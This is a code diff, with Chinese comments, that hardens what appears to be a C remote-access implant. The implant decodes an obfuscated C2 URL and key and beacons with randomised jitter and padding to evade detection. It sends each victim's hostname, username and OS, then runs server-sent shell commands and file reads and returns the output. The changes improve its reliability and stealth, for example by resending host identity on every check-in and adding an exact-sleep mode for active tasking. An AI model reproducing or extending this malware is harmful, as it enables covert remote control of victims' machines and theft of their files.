@@ -34,6 +34,7 @@ static char g_json_key[24];
 static unsigned char g_key[32];
 static char g_id[17];
 static unsigned int g_interval;
+static int g_exact; /* 1 = 干活：按 g_interval 整秒睡，不再乘浮动 */
 
 static void deob(const unsigned char *in, size_t n, char *out) {
     size_t i;
@@ -50,12 +51,23 @@ typedef struct {
 
 static int buf_grow(buf_t *b, size_t need) {
     unsigned char *p;
+    size_t ncap;
+    /* 单块缓冲封顶，避免一条异常回包把宿主机内存吃光。 */
+    if (need > (size_t)WIRE_MAX || b->len > (size_t)WIRE_MAX - need) return -1;
     if (b->len + need <= b->cap) return 0;
-    b->cap = b->cap ? b->cap : 256;
-    while (b->len + need > b->cap) b->cap *= 2;
-    p = (unsigned char *)realloc(b->data, b->cap);
+    ncap = b->cap ? b->cap : 256;
+    while (ncap < b->len + need) {
+        if (ncap > (size_t)WIRE_MAX / 2) {
+            ncap = (size_t)WIRE_MAX;
+            break;
+        }
+        ncap *= 2;
+    }
+    if (ncap < b->len + need) return -1;
+    p = (unsigned char *)realloc(b->data, ncap);
     if (!p) return -1;
     b->data = p;
+    b->cap = ncap;
     return 0;
 }
 
@@ -67,6 +79,7 @@ static void buf_raw(buf_t *b, const void *value, size_t n) {
 
 static void buf_tlv(buf_t *b, unsigned char type, const void *value, size_t n) {
     unsigned char lenb[2];
+    if (n > 0xFFFF) return; /* 长度字段只有 16 位，超长直接丢掉，不能截断后错位 */
     lenb[0] = (unsigned char)(n & 0xff);
     lenb[1] = (unsigned char)((n >> 8) & 0xff);
     buf_raw(b, &type, 1);
@@ -249,6 +262,7 @@ static char *tlv_str(const unsigned char *src, size_t n) {
 static void run_tasks(const buf_t *tasks, buf_t *results) {
     const unsigned char *p = tasks->data;
     size_t remain = tasks->len;
+    int ran = 0;
     while (remain >= 3) {
         unsigned char type = p[0];
         size_t n = (size_t)p[1] | ((size_t)p[2] << 8);
@@ -257,6 +271,7 @@ static void run_tasks(const buf_t *tasks, buf_t *results) {
         v = p + 3;
         switch (type) {
         case TLV_EXEC_TASK:
+            if (ran >= MAX_TASKS || results->len >= (size_t)RESULT_CAP) break;
             if (n >= 6) {
                 uint32_t task_id;
                 int timeout_sec;
@@ -267,10 +282,12 @@ static void run_tasks(const buf_t *tasks, buf_t *results) {
                 if (cmd) {
                     do_exec_task(task_id, cmd, timeout_sec, results);
                     free(cmd);
+                    ran++;
                 }
             }
             break;
         case TLV_READ_TASK:
+            if (ran >= MAX_TASKS || results->len >= (size_t)RESULT_CAP) break;
             if (n >= 4) {
                 uint32_t task_id;
                 char *path;
@@ -279,6 +296,7 @@ static void run_tasks(const buf_t *tasks, buf_t *results) {
                 if (path) {
                     do_read_task(task_id, path, results);
                     free(path);
+                    ran++;
                 }
             }
             break;
@@ -290,11 +308,12 @@ static void run_tasks(const buf_t *tasks, buf_t *results) {
             }
             break;
         case TLV_NEXT_HINT:
-            /* 服务器逐轮下发的间隔提示：活跃窗口内是快间隔，空闲是基准值 */
+            /* 4 字节基准秒数，第 5 字节为 1 时本轮按整秒睡（干活）。 */
             if (n >= 4) {
                 uint32_t iv;
                 memcpy(&iv, v, 4);
                 if (iv >= 5 && iv <= 86400) g_interval = iv;
+                g_exact = (n >= 5 && v[4] == 1);
             }
             break;
         case TLV_EXIT_TASK:
@@ -316,11 +335,9 @@ static double rand_uniform(double lo, double hi) {
 }
 
 static double next_interval(void) {
-    double f = rand_uniform(0.5, 1.7);
-    unsigned char b;
-    rand_bytes(&b, 1);
-    if (b < 21) f *= rand_uniform(2.0, 3.0); /* ~8% skip cycles */
-    return (double)g_interval * f;
+    if (g_exact) return (double)g_interval;
+    /* 空闲：每跳重新抽，倍率落在 [0.5, 3]。 */
+    return (double)g_interval * rand_uniform(0.5, 3.0);
 }
 
 int main(void) {
@@ -329,12 +346,13 @@ int main(void) {
     unsigned char idhash[32];
     buf_t kctx = {0, 0, 0}, idb = {0, 0, 0}, results = {0, 0, 0};
     uint32_t pid = 0;
-    int first = 1;
     double backoff = 1.0;
     size_t i;
 
     if (sys_init() != 0) return 1;
-    if (CFG_URL_LEN >= sizeof g_url) return 1; /* config 与解码缓冲不匹配，拒绝运行 */
+    /* config 与解码缓冲不匹配就拒绝运行，避免写爆栈上的固定数组。 */
+    if (CFG_URL_LEN >= sizeof g_url || CFG_UA_LEN >= sizeof g_ua ||
+        CFG_JSON_KEY_LEN >= sizeof g_json_key || CFG_KEY_LEN != 32) return 1;
     deob(CFG_URL, CFG_URL_LEN, g_url);
     deob(CFG_UA, CFG_UA_LEN, g_ua);
     deob(CFG_JSON_KEY, CFG_JSON_KEY_LEN, g_json_key);
@@ -370,14 +388,12 @@ int main(void) {
         memcpy(ts8, &now, 8);
         buf_tlv(&pt, TLV_ID, g_id, strlen(g_id));
         buf_tlv(&pt, TLV_TS, ts8, 8);
-        if (first) {
-            buf_tlv(&pt, TLV_HOST, hostname, strlen(hostname));
-            buf_tlv(&pt, TLV_OS, os, strlen(os));
-            buf_tlv(&pt, TLV_ARCH, arch, strlen(arch));
-            buf_tlv(&pt, TLV_USER, username, strlen(username));
-            buf_tlv(&pt, TLV_PID, &pid, 4);
-            first = 0;
-        }
+        /* 每次都带主机信息：服务端重启后内存记录会丢，只在首包里带会变成一台没有名字的信标。 */
+        buf_tlv(&pt, TLV_HOST, hostname, strlen(hostname));
+        buf_tlv(&pt, TLV_OS, os, strlen(os));
+        buf_tlv(&pt, TLV_ARCH, arch, strlen(arch));
+        buf_tlv(&pt, TLV_USER, username, strlen(username));
+        buf_tlv(&pt, TLV_PID, &pid, 4);
         if (results.len) buf_raw(&pt, results.data, results.len);
         rand_bytes(pad, sizeof pad);
         buf_tlv(&pt, TLV_PAD, pad, (size_t)(1 + pad[0])); /* 1..256B size jitter */
@@ -399,7 +415,11 @@ int main(void) {
         }
         free(body);
         backoff = 1.0;
-        results.len = 0; /* server consumed the pending results */
+        /* 服务端已经收下结果。把缓冲还回去，不要按历史最大输出一直占着。 */
+        results.len = 0;
+        free(results.data);
+        results.data = NULL;
+        results.cap = 0;
 
         if (parse_envelope(resp, resp_len, &tasks) == 0) {
             run_tasks(&tasks, &results);
